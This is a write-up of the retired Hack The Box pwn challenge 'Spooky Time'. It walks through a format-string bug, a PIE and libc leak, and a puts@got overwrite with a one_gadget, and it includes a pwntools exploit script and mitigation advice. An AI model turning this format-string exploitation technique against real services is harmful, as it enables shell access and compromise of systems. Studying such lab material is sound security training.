---
challenge: Spooky Time
type: Pwn
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [pwn, format-string, got-overwrite, pie, aslr, pwntools]
---

# Spooky Time — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Documented challenge; no real flags.
> libc offsets depend on the provided build; placeholders are used.

## TL;DR

A 64-bit binary with PIE, canary and NX calls `printf` with two user-controlled strings. The first leak bypasses PIE and ASLR; the second is an arbitrary write with `%n`. The controlled stack offset is 8. Overwrite `puts@got` with a `one_gadget` from the provided libc and get a shell.

## Brief and surface

- Pwn, Medium, retired.
- `spooky_time`, the challenge libc and a remote service are provided.
- The binary asks for two phrases and passes them to `printf` as format strings.

```bash
file spooky_time
checksec --file=spooky_time
```

```text
Arch: amd64-64-little
RELRO: Partial/No RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
RUNPATH: ./glibc/
```

## Recon

```bash
./spooky_time
# asks for a phrase
AAAA %p %p %p
```

The output repeats stack values. Try `%8$lx` with `AAAABBBB` and you get `4242424241414141`: offset 8 holds the input. That is the control point for `%n`.

## Source analysis

`main` calls `printf` twice with the user buffer:

```c
printf(user_input);   // first phrase
printf(user_input2);  // second phrase
```

There is no `printf("%s", user_input)`. The first call leaks; the second writes. The canary is untouched because there is no stack overflow: the bug is format string.

## The bug

`%n` writes the number of bytes printed so far to the address pointed to by the matching argument. If the buffer is on the stack and offset 8 is controlled, a address can be placed and `%hn` writes two bytes. `pwntools` automates the split:

```python
payload = fmtstr_payload(8, {elf.got.puts: glibc.address + one_gadget})
```

The first leak needs two addresses: one from the binary (PIE) and one from libc (ASLR). In the reference build, `%51$p` and `%69$p` return them; subtract the matching symbols to get the bases.

## Local reproduction

```bash
python3 -m venv .venv
. .venv/bin/activate
pip install pwntools
one_gadget glibc/libc.so.6
```

Disable ASLR for the first test (`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`) and re-enable it afterwards. The binary finds libc in `./glibc/` via `RUNPATH`; run it from that directory.

## Exploitation

Script skeleton:

```python
from pwn import *
context.binary = elf = ELF('./spooky_time')
libc = ELF('./glibc/libc.so.6')

p = process()
p.sendlineafter(b'something scary!', b'%51$p.%69$p')
p.recvuntil(b'better than\n')
leaks = p.recvline().strip().split(b'.')
elf.address = int(leaks[0], 16) - elf.sym['main']
libc.address = int(leaks[1], 16) - 128 - libc.sym['__libc_start_main']

one_gadget = libc.address + <ONE_GADGET_OFFSET>
payload = fmtstr_payload(8, {elf.got.puts: one_gadget})
p.sendlineafter(b'one more time..', payload)
p.interactive()
```

The next `puts` call jumps to the `one_gadget`. If its constraints fail, try the other offsets printed by `one_gadget`. Remotely, use the challenge libc, not the system one.

## Evidence

- `checksec` and `%8$lx` output.
- PIE and libc base calculations.
- Shell and `id`, no flag.

## Lessons learned

- `printf(user_input)` is both a read and a write primitive, not just a leak.
- Offset 8 is where the stack buffer appears as an argument.
- PIE and ASLR need two leaks, not one.
- The challenge libc rules: system offsets do not apply.

## Mitigations and detection

- Use `printf("%s", input)` or `fputs`; never pass input as a format string.
- Build with `-Wformat-security` and `-D_FORTIFY_SOURCE=2`.
- Full RELRO and `-z now` make GOT overwrites harder.
- Detection: `%n`/`%hn` strings in network input and anomalous crashes in processes printing user data.

## References

- <https://7rocky.github.io/en/ctf/htb-challenges/pwn/spooky-time/>
- <https://docs.pwntools.com/en/stable/fmtstr.html>
- <https://github.com/david942j/one_gadget>
